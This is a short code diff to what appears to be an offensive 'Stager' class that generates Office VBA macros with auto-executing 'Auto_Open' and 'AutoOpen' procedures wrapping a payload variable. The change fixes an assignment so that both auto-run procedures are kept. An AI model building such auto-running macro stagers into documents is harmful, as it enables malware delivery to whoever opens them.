@@ -113,7 +113,7 @@ class Stager:
             macro = "Sub Auto_Open()\n"
             macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
-            macro = "Sub AutoOpen()\n"
+            macro += "Sub AutoOpen()\n"
             macro += "\t"+Method+"\n"
             macro += "End Sub\n\n"
 
